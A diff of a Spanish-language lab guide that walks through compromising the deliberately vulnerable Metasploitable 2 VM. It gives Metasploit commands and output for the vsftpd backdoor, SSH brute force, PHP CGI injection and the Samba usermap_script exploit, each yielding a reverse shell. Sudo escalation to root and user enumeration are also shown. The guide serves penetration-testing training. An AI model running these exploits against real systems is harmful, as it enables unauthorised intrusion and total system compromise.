@@ -16,7 +16,9 @@ A lo largo del laboratorio se cubren los siguientes puntos:
 - Acceso al sistema mediante credenciales débiles.
 - Escalada de privilegios mediante una mala configuración de `sudo`.
 
-Esta guía está pensada **exclusivamente para entornos de laboratorio y aprendizaje**. Metasploitable 2 es intencionadamente insegura y no debe exponerse nunca a redes reales o no controladas.
+> **Aviso:** Esta guía está pensada **exclusivamente para entornos de laboratorio y aprendizaje**. Metasploitable 2 es intencionadamente insegura y no debe exponerse nunca a redes reales o no controladas.
+
+---
 
 ## 1. Descarga de Metasploitable 2
 
@@ -27,6 +29,8 @@ https://www.rapid7.com/products/metasploit/metasploitable/
 En esa página, se pulsa el botón **Download** para descargar la máquina virtual.
 
 El archivo descargado es un **.zip**, que contiene los ficheros de la máquina virtual.
+
+---
 
 ## 2. Extracción de los archivos
 
@@ -39,6 +43,8 @@ Una vez descargado el archivo ZIP:
 
 Esta carpeta será la que se utilice para importar la máquina en VMware.
 
+---
+
 ## 3. Importar Metasploitable en VMware
 
 1. Abrir **VMware**.
@@ -49,6 +55,8 @@ Esta carpeta será la que se utilice para importar la máquina en VMware.
 
 VMware cargará la configuración de la máquina virtual y la máquina quedará lista para usarse.
 
+---
+
 ## 4. Primer arranque y acceso al sistema
 
 Durante el arranque, Metasploitable 2 muestra un aviso indicando que la máquina **no debe exponerse a redes no confiables**.
@@ -56,6 +64,7 @@ Durante el arranque, Metasploitable 2 muestra un aviso indicando que la máquina
 Tras finalizar el inicio, aparece la pantalla de login.
 
 Credenciales por defecto:
+
 - Usuario: `msfadmin`
 - Contraseña: `msfadmin`
 
@@ -67,9 +76,11 @@ Introduciendo estas credenciales se accede correctamente al sistema.
 
 Una vez dentro, se muestra un prompt bajo el usuario `msfadmin`, confirmando que la máquina funciona correctamente.
 
+---
+
 ## 5. Comprobación de la dirección IP y conectividad
 
-Una vez iniciada sesión en Metasploitable 2, el siguiente paso es identificar la **dirección IP** que le ha sido asignada a la máquina virtual, ya que será necesaria para trabajar con ella desde la máquina atacante (por ejemplo, Kali Linux).
+Una vez iniciada sesión en Metasploitable 2, el siguiente paso es identificar la **dirección IP** que le ha sido asignada a la máquina virtual.
 
 ### 5.1 Obtener la IP desde Metasploitable
 
@@ -80,7 +91,7 @@ ifconfig
 ```
 
 En la interfaz de red `eth0` se puede ver la dirección IP asignada.  
-En este caso, la máquina Metasploitable ha recibido la siguiente IP:
+En este caso:
 
 ```text
 192.168.184.130
@@ -88,42 +99,33 @@ En este caso, la máquina Metasploitable ha recibido la siguiente IP:
 
 ### 5.2 Comprobar conectividad desde Kali Linux
 
-Desde la máquina Kali Linux, se comprueba si hay visibilidad de red hacia Metasploitable usando ping:
+Desde Kali Linux:
 
 ```bash
 ping 192.168.184.130
 ```
 
-La respuesta correcta confirma que:
+La respuesta confirma que:
 
 - Ambas máquinas están en la misma red de laboratorio
 - Existe conectividad entre Kali y Metasploitable
-- El entorno está listo para comenzar las pruebas
+- El entorno está listo para comenzar
 
 ### 5.3 Descubrir la IP si no se conoce (netdiscover)
 
-En caso de no conocer la IP de Metasploitable, se puede descubrir utilizando una herramienta de descubrimiento de hosts en red, como `netdiscover`.
-
-Desde Kali Linux:
+En caso de no conocer la IP, se puede descubrir con `netdiscover`:
 
 ```bash
 sudo netdiscover
 ```
 
-Esta herramienta envía peticiones ARP en la red local y muestra los hosts activos.  
-En la salida se puede identificar la máquina Metasploitable por:
+La herramienta envía peticiones ARP en la red local y muestra hosts activos, permitiendo identificar Metasploitable por IP/MAC/fabricante (VMware).
 
-- Su dirección IP
-- Su dirección MAC
-- El fabricante (por ejemplo, VMware, Inc.)
-
-De esta forma, incluso sin acceso directo a la consola de Metasploitable, es posible localizar su dirección IP dentro del laboratorio.
+---
 
 ## 6. Enumeración de servicios con Nmap
 
-Una vez confirmada la conectividad con la máquina Metasploitable, el siguiente paso es realizar un **escaneo completo de puertos y servicios** para identificar qué servicios están expuestos y qué versiones se están ejecutando.
-
-Para ello se utiliza el siguiente comando:
+Para obtener puertos, servicios y versiones:
 
 ```bash
 nmap -p- -sCV -n -Pn -vvv -T5 192.168.184.130 -oN fullscan
@@ -132,60 +134,45 @@ nmap -p- -sCV -n -Pn -vvv -T5 192.168.184.130 -oN fullscan
 ### 6.1 Explicación del comando
 
 - `-p-`: Escanea todos los puertos TCP (1–65535).
-- `-sC`: Ejecuta los scripts por defecto de Nmap (detección de configuraciones inseguras y vulnerabilidades comunes).
-- `-sV`: Intenta detectar versiones de los servicios.
-- `-n`: No realiza resolución DNS (más rápido).
-- `-Pn`: No hace descubrimiento de host (asume que el host está activo).
-- `-vvv`: Modo muy verboso (más detalle en la salida).
-- `-T5`: Plantilla de tiempo agresiva (más rápido, para entornos controlados de laboratorio).
-- `-oN fullscan`: Guarda el resultado en un archivo llamado `fullscan`.
+- `-sC`: Ejecuta scripts por defecto de Nmap (NSE default).
+- `-sV`: Detección de versiones.
+- `-n`: Sin resolución DNS.
+- `-Pn`: Asume host activo.
+- `-vvv`: Muy verboso.
+- `-T5`: Timing agresivo (solo en laboratorio).
+- `-oN fullscan`: Exporta a fichero.
 
-Este tipo de comando es típico en entornos de laboratorio o pruebas controladas, ya que es un escaneo agresivo que busca obtener la máxima información posible del objetivo.
-
-### 6.2 Revisión de resultados
-
-Una vez finalizado el escaneo, se revisa el contenido del archivo generado:
+### 6.2 Revisión y organización de resultados
 
 ```bash
 cat fullscan
-```
-
-Para mantener el trabajo organizado, se crea un directorio y se mueve el archivo de resultados:
-
-```bash
 mkdir metasploitable
 mv fullscan metasploitable/
 cd metasploitable
 ls
 ```
 
-De esta forma, los resultados del escaneo quedan almacenados y organizados para su posterior análisis.
+### 6.3 FTP (puerto 21) y FTP anónimo
 
-### 6.3 Primer servicio identificado: FTP (puerto 21)
-
-El primer puerto relevante que reporta Nmap es:
+Nmap reporta:
 
 - Puerto: `21/tcp`
-- Servicio: `FTP`
+- Servicio: FTP
 - Versión: `vsftpd 2.3.4`
 
-Además, los scripts de Nmap indican lo siguiente:
+Y además:
 
 ```text
 ftp-anon: Anonymous FTP login allowed (FTP code 230)
 ```
 
-Esto significa que el servidor FTP permite acceso anónimo sin credenciales, lo cual es una configuración insegura.
-
-### 6.4 Comprobación de acceso FTP anónimo
-
-Para verificarlo, se intenta conexión desde Kali:
+### 6.4 Verificación manual de FTP anónimo
 
 ```bash
 ftp Anonymous@192.168.184.130
 ```
 
-Cuando el servidor solicita la contraseña, simplemente se pulsa **Enter** sin introducir ninguna.
+Cuando pida contraseña, pulsar **Enter**.
 
 Resultado:
 
@@ -193,75 +180,44 @@ Resultado:
 230 Login successful.
 ```
 
-Esto confirma que:
-
-- El servidor permite acceso FTP sin autenticación.
-- Cualquier usuario puede listar, descargar (y en algunos casos subir) archivos.
-- Si existieran ficheros sensibles, podrían ser accedidos sin ningún tipo de control.
-
-Este es un ejemplo claro de vulnerabilidad de configuración identificada gracias a la enumeración automática con Nmap y verificada manualmente.
+---
 
 ## 7. Explotación del servicio FTP vulnerable (vsftpd 2.3.4)
 
-Durante la fase de enumeración se identificó que el puerto **21/tcp** estaba abierto y que el servicio era **vsftpd 2.3.4**.  
-Esta versión es conocida por contener una **puerta trasera (backdoor)** que permite ejecución de comandos remotos.
-
-### 7.1 Búsqueda de exploits con searchsploit
+### 7.1 Búsqueda con searchsploit
 
 ```bash
 searchsploit vsftpd 2.3.4
 ```
 
-El resultado muestra, entre otros, exploits conocidos (incluyendo uno para Metasploit), lo que confirma que existe una vulnerabilidad explotable para este servicio.
-
 ### 7.2 Uso de Metasploit Framework
-
-Se inicia Metasploit:
 
 ```bash
 msfconsole
 ```
 
-Se busca el módulo:
+Buscar y usar:
 
 ```text
 search vsftpd 2.3.4
-```
-
-Se utiliza el exploit:
-
-```text
 use exploit/unix/ftp/vsftpd_234_backdoor
 ```
 
-### 7.3 Configuración del exploit
+### 7.3 Configuración
 
-Se revisan las opciones necesarias:
-
-```text
-show options
-```
-
-Parámetros importantes:
-
-- `RHOSTS`: IP de la víctima (Metasploitable)
-- `RPORT`: Puerto del servicio FTP (21)
-- `CHOST`: IP de la máquina atacante (Kali)
-- `CPORT`: Puerto local para recibir la conexión
-
-Primero se obtiene la IP de Kali con:
+Obtener IP atacante:
 
 ```bash
 ifconfig
 ```
 
-En este caso, la IP del atacante es:
+Ejemplo IP Kali:
 
 ```text
 192.168.184.128
 ```
 
-Se configuran las opciones:
+Configurar:
 
 ```text
 set CHOST 192.168.184.128
@@ -269,62 +225,56 @@ set CPORT 9090
 set RHOSTS 192.168.184.130
 ```
 
-### 7.4 Ejecución del exploit
-
-Una vez configurado todo, se lanza el exploit con:
+### 7.4 Ejecución
 
 ```text
 run
 ```
 
-Ejemplo de salida relevante:
+Salida típica:
 
 ```text
-[+] 192.168.184.130:21 - Backdoor service has been spawned, handling...
-[+] 192.168.184.130:21 - UID: uid=0(root) gid=0(root)
+[+] ... Backdoor service has been spawned ...
+[+] ... UID: uid=0(root) gid=0(root)
 [*] Found shell.
 [*] Command shell session opened
 ```
 
-### 7.5 Impacto de la vulnerabilidad
+### 7.5 Impacto
 
-Esta vulnerabilidad permite a un atacante ejecutar comandos remotamente y comprometer totalmente la máquina (RCE crítico).
+Ejecución remota de comandos como root (RCE crítico) → compromiso total.
 
-## 8. Acceso a la máquina víctima tras la explotación
+---
 
-Tras ejecutar el exploit, Metasploit muestra un mensaje similar a:
+## 8. Acceso a la víctima tras la explotación
+
+Metasploit indica una sesión similar a:
 
 ```text
 Command shell session 1 opened (192.168.184.128:9090 -> 192.168.184.130:6200)
 ```
 
-Esto indica que la víctima ha iniciado una conexión de vuelta hacia el atacante y Metasploit nos proporciona una shell interactiva.
-
-### 8.1 Verificación de que estamos dentro de la víctima
-
-Para confirmarlo:
+Verificar en la shell:
 
 ```bash
 ifconfig
 ```
 
-En la salida se observa la IP de la víctima:
+Debe aparecer la IP de la víctima (`192.168.184.130`).
 
-```text
-inet addr: 192.168.184.130
-```
+---
 
-## 9. Ataque de fuerza bruta contra SSH usando Metasploit
+## 9. Fuerza bruta contra SSH con Metasploit
 
-Tras revisar `fullscan`, se identifica el servicio SSH:
+Nmap reporta SSH:
 
 ```text
 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1
 ```
 
-### 9.1 Preparación de diccionarios
+### 9.1 Diccionarios
 
-Archivo `users`:
+`users`:
 
 ```text
 admin
@@ -332,7 +282,7 @@ admin123
 msfadmin
 ```
 
-Archivo `passwords`:
+`passwords`:
 
 ```text
 pass
@@ -340,7 +290,7 @@ password
 msfadmin
 ```
 
-### 9.2 Selección del módulo de Metasploit
+### 9.2 Módulo
 
 ```bash
 msfconsole
@@ -351,17 +301,7 @@ search ssh_login
 use auxiliary/scanner/ssh/ssh_login
 ```
 
-### 9.3 Configuración del módulo
-
-Opciones relevantes:
-
-- `RHOSTS`
-- `RPORT`
-- `USER_FILE`
-- `PASS_FILE`
-- `STOP_ON_SUCCESS`
-
-Ejemplo de configuración:
+### 9.3 Configuración
 
 ```text
 set RHOSTS 192.168.184.130
@@ -371,34 +311,27 @@ set PASS_FILE passwords
 set STOP_ON_SUCCESS true
 ```
 
-### 9.4 Ejecución del ataque
+### 9.4 Ejecución
 
 ```text
 run
 ```
 
-Si una combinación es válida, el módulo lo indicará y puede abrir una sesión automáticamente.
+---
 
-## 10. Compromiso del servicio SSH mediante credenciales válidas
+## 10. Acceso por SSH con credenciales válidas
 
-En este caso, se encuentra una credencial válida:
+Resultado típico:
 
 ```text
 Success: 'msfadmin:msfadmin'
 SSH session 1 opened (192.168.184.128 -> 192.168.184.130:22)
 ```
 
-### 10.1 Gestión de sesiones
-
-Listar sesiones:
+### 10.1 Sesiones
 
 ```text
 sessions
-```
-
-Interactuar con la sesión 1:
-
-```text
 sessions 1
 ```
 
@@ -412,9 +345,9 @@ whoami
 msfadmin
 ```
 
-## 11. Escalada de privilegios mediante sudo
+---
 
-Aunque el acceso por SSH corresponde al usuario `msfadmin`, se comprueba si tiene permisos especiales:
+## 11. Escalada de privilegios con sudo
 
 ```bash
 sudo -l
@@ -427,16 +360,12 @@ User msfadmin may run the following commands on this host:
     (ALL) ALL
 ```
 
-### 11.1 Obtención de shell como root
-
-Dado que puede ejecutar cualquier comando con sudo:
+### 11.1 Root
 
 ```bash
 sudo su
 whoami
 ```
-
-Salida:
 
 ```text
 root
@@ -444,39 +373,400 @@ root
 
 ### 11.2 Impacto
 
-- Cualquier atacante que comprometa `msfadmin` puede obtener acceso root inmediato.
-- No existe separación de privilegios real.
-- El sistema queda completamente comprometido.
+Cualquier compromiso de `msfadmin` → root inmediato. No hay separación real de privilegios.
 
-En un entorno real, esto debería corregirse limitando estrictamente qué usuarios pueden usar `sudo` y qué comandos pueden ejecutar, aplicando el principio de mínimos privilegios.
-
+---
 
 ## 12. Conclusiones
 
-Esta práctica ha permitido reproducir un escenario completo de compromiso de un sistema vulnerable en un entorno controlado, siguiendo un flujo realista de trabajo en pentesting y seguridad ofensiva.
+Este laboratorio reproduce un flujo completo de compromiso en un entorno controlado:
 
-A lo largo del laboratorio se han puesto en práctica las siguientes habilidades:
+- Despliegue en VMware
+- Enumeración (Nmap)
+- Detección de configuraciones inseguras (FTP anónimo)
+- Explotación (vsftpd 2.3.4)
+- Acceso remoto (reverse shell/sesiones)
+- Ataque a credenciales (SSH)
+- Escalada por mala configuración (`sudo`)
 
-- Despliegue y preparación de un entorno vulnerable en VMware.
-- Identificación de activos en red y verificación de conectividad.
-- Enumeración exhaustiva de servicios y versiones mediante Nmap.
-- Detección de configuraciones inseguras (FTP con acceso anónimo).
-- Identificación de vulnerabilidades conocidas en servicios expuestos (vsftpd 2.3.4).
-- Explotación de una vulnerabilidad crítica que permite ejecución remota de comandos (RCE).
-- Obtención de acceso remoto mediante reverse shell usando Metasploit.
-- Ataque de fuerza bruta contra un servicio SSH usando diccionarios personalizados.
-- Acceso al sistema mediante credenciales débiles.
-- Escalada de privilegios debido a una mala configuración de sudo.
+Refuerza la importancia de:
 
-Este laboratorio demuestra cómo una combinación de **servicios vulnerables, credenciales débiles y malas configuraciones** puede llevar al **compromiso total de un sistema**, incluso sin necesidad de vulnerabilidades complejas.
+- Mantener servicios actualizados
+- Deshabilitar accesos anónimos
+- Políticas de contraseñas robustas
+- Principio de mínimos privilegios en `sudo`
+- Monitorización y auditoría de servicios expuestos
 
-Desde el punto de vista defensivo, refuerza la importancia de:
+---
 
-- Mantener los servicios actualizados.
-- Deshabilitar accesos anónimos innecesarios.
-- Usar contraseñas robustas y políticas de autenticación seguras.
-- Restringir correctamente los privilegios de sudo.
-- Monitorizar y auditar los servicios expuestos a red.
+# Metasploitable 2 — Laboratorio Completo de Enumeración y Explotación (Servicios adicionales)
 
-En conjunto, esta práctica consolida conocimientos fundamentales de **enumeración, explotación, post-explotación y escalada de privilegios**, y refleja un flujo de trabajo realista utilizado en auditorías de seguridad y pruebas de penetración profesionales.
+> En esta sección se documentan servicios adicionales identificados tras `fullscan` y su explotación/enumeración.
+
+---
+
+# 13️⃣ Telnet (23/tcp)
+
+```text
+23/tcp open telnet Linux telnetd
+```
+
+Después de explotar SSH, revisamos nuevamente `fullscan` y detectamos Telnet.
+
+Telnet es un protocolo antiguo (1969) que permite acceso remoto sin cifrado. Hoy en día está obsoleto porque transmite credenciales en texto plano.
+
+## Conexión
+
+```bash
+telnet 192.168.184.130
+```
+
+No es necesario indicar puerto (usa 23 por defecto).
+
+📷 **Imagen — Login Telnet**  
+![Telnet Login](image_telnet_login.png)
+
+En este laboratorio el servicio está mal configurado y permite autenticación con credenciales débiles.
+
+📷 **Imagen — Sesión Telnet iniciada**  
+![Telnet Session](image_telnet_session.png)
+
+---
+
+# 14️⃣ SMTP (25/tcp)
+
+```text
+25/tcp open smtp Postfix smtpd
+```
+
+## Conexión con Netcat
+
+```bash
+nc 192.168.184.130 25
+```
+
+Netcat permite interactuar manualmente con servicios TCP (conexiones salientes o modo escucha, útil también para reverse shells).
+
+📷 **Imagen — Conexión SMTP con HELO**  
+![SMTP HELO](image_smtp_helo.png)
+
+## Envío manual de correo
+
+```text
+MAIL FROM:<atacante@inventando.com>
+250 2.1.0 Ok
+
+RCPT TO:<msfadmin@metasploitable.localdomain>
+250 2.1.5 Ok
+
+DATA
+354 End data with <CR><LF>.<CR><LF>
+
+contenido del correo
+.
+
+250 2.0.0 Ok: queued as D7793CBB9
+```
+
+El mensaje queda en cola.
+
+Para salir:
+
+```text
+QUIT
+```
+
+---
+
+## Enumeración de usuarios con VRFY
+
+`VRFY` permite verificar si un usuario existe localmente en el servidor SMTP (útil para enumeración de usuarios):
+
+```text
+VRFY root
+252 2.0.0 root
+
+VRFY admin
+550 5.1.1 <admin>: Recipient address rejected: User unknown in local recipient table
+
+VRFY msfadmin
+252 2.0.0 msfadmin
+```
+
+- `252` → Usuario existe  
+- `550` → Usuario no existe  
+
+## Enumeración automatizada con smtp-user-enum
+
+Permite pasar una lista de usuarios y comprobar existencia por fuerza bruta:
+
+```bash
+smtp-user-enum -M VRFY -U users -t 192.168.184.130
+```
+
+**Explicación:**
+
+- `-M VRFY` → Método (VRFY).
+- `-U users` → Fichero con usuarios a probar.
+- `-t 192.168.184.130` → Objetivo (target).
+
+Ejemplo de salida:
+
+```text
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... VRFY
+Worker Processes ......... 5
+Usernames file ........... users
+Target count ............. 1
+Username count ........... 4
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............
+
+######## Scan started at Thu Feb 12 12:42:57 2026 #########
+192.168.184.130: msfadmin exists
+######## Scan completed at Thu Feb 12 12:43:02 2026 #########
+1 results.
+
+4 queries in 5 seconds (0.8 queries / sec)
+```
+
+---
+
+# 15️⃣ HTTP (80/tcp)
+
+Accedemos a:
+
+```text
+http://192.168.184.130
+```
+
+📷 **Imagen — Página principal**  
+![Web Home](image_web_home.png)
+
+## Enumeración de rutas con ffuf
+
+```bash
+ffuf -u http://192.168.184.130/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+
+**Explicación:**
+
+- `-u` → URL objetivo (donde `FUZZ` será sustituido).
+- `FUZZ` → Punto de fuzzing para rutas.
+- `-c` → Salida con colores.
+- `-w` → Wordlist.
+
+📷 **Imagen — Resultado ffuf**  
+![FFUF Results](image_ffuf.png)
+
+Ejemplos de resultados:
+
+```text
+test                    [Status: 301, Size: 322, Words: 21, Lines: 10]
+twiki                   [Status: 301, Size: 323, Words: 21, Lines: 10]
+tikiwiki                [Status: 301, Size: 326, Words: 21, Lines: 10]
+phpinfo                 [Status: 200, Size: 48074, Words: 2409, Lines: 657]
+server-status           [Status: 403, Size: 301, Words: 22, Lines: 11]
+phpMyAdmin              [Status: 301, Size: 328, Words: 21, Lines: 10]
+```
+
+📷 **Imagen — Directorio /test**  
+![Test Directory](image_test.png)
+
+## phpinfo como vulnerabilidad
+
+`/phpinfo` es una fuga de información porque expone detalles sensibles del servidor y PHP.
+
+📷 **Imagen — phpinfo**  
+![PHP Info](image_phpinfo.png)
+
+En `Server API` aparece **FastCGI**, lo que puede abrir la puerta a técnicas específicas (dependiendo de configuración/versión).
+
+---
+
+## Explotación: PHP CGI Argument Injection (Metasploit)
+
+En Metasploit:
+
+```bash
+msfconsole
+search PHP CGI
+```
+
+De los módulos encontrados, seleccionamos el genérico:
+
+```text
+exploit/multi/http/php_cgi_arg_injection
+```
+
+Uso:
+
+```text
+use exploit/multi/http/php_cgi_arg_injection
+show options
+set RHOSTS 192.168.184.130
+run
+```
+
+📷 **Imagen — Meterpreter shell**  
+![Meterpreter](image_meterpreter.png)
+
+Tras abrir sesión, lanzamos una shell:
+
+```text
+shell
+whoami
+www-data
+```
+
+**¿Por qué `www-data`?**  
+Porque el código se ejecuta a través del servidor web. En Linux, Apache suele ejecutarse bajo el usuario de servicio `www-data`.
+
+Enumeración rápida:
+
+```text
+pwd
+/var/www
+
+ls
+dav
+dvwa
+index.php
+mutillidae
+phpMyAdmin
+phpinfo.php
+test
+tikiwiki
+tikiwiki-old
+twiki
+```
+
+### Nota sobre Meterpreter
+
+Meterpreter es un pseudo-terminal de Metasploit:
+
+- Tiene comandos propios, pero no siempre es una shell nativa completa.
+- “Hace más ruido” (más detectable) que una shell tradicional.
+- En un entorno real podría ser bloqueado por AV/EDR.
+- `shell` permite pasar a una shell más “real” e interactiva.
+
+---
+
+# 16️⃣ SMB / Samba (139/tcp y 445/tcp)
+
+Nmap reporta:
+
+```text
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+```
+
+**Samba/SMB** permite compartir ficheros/recursos en red. Es muy común en entornos Windows/Active Directory, pero también se usa en Linux.
+
+## Enumeración con smbclient
+
+```bash
+smbclient -L //192.168.184.130/ -N
+```
+
+**Explicación de opciones:**
+
+- `-L` → Lista los recursos compartidos (shares).
+- `//192.168.184.130/` → Servidor objetivo.
+- `-N` → No solicita contraseña (login anónimo).
+
+Salida ejemplo:
+
+```text
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        tmp             Disk      oh noes!
+        opt             Disk
+        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+```
+
+Permite enumeración anónima → mala configuración (exposición de información).
+
+---
+
+## Identificación de versión vulnerable y explotación
+
+El escaneo aportó la versión:
+
+- `Samba smbd 3.0.20-Debian`
+
+Buscamos en Metasploit:
+
+```bash
+msfconsole
+search samba 3.0.20
+```
+
+Módulo encontrado:
+
+```text
+exploit/multi/samba/usermap_script
+```
+
+Esta vulnerabilidad permite **ejecución remota de comandos** (RCE).
+
+### Explotación
+
+```text
+use exploit/multi/samba/usermap_script
+show options
+set RHOSTS 192.168.184.130
+run
+```
+
+Salida típica:
+
+```text
+[*] Started reverse TCP handler on 192.168.184.128:4444
+[*] Command shell session 1 opened ...
+```
+
+Dentro de la shell:
+
+```text
+whoami
+root
+```
+
+Compromiso total del sistema.
+
+> Nota: esto demuestra lo importante que es `-sV` en Nmap: con la versión exacta, la búsqueda de exploits es inmediata.
+
+---
+
+# ✅ Conclusión final
+
+El laboratorio muestra cómo una combinación de servicios:
+
+- vulnerables,
+- obsoletos,
+- mal configurados,
+- y con credenciales débiles,
+
+puede llevar al **compromiso total** de un sistema, incluso sin técnicas avanzadas.
+
+Servicios documentados:
+
+- FTP (vsftpd 2.3.4)
+- SSH (credenciales débiles / fuerza bruta)
+- Sudo (mala configuración)
+- Telnet (obsoleto y sin cifrado)
+- SMTP (enumeración de usuarios y envío manual)
+- HTTP (enumeración de rutas + phpinfo + RCE por CGI)
+- SMB/Samba (enumeración anónima + RCE)
 
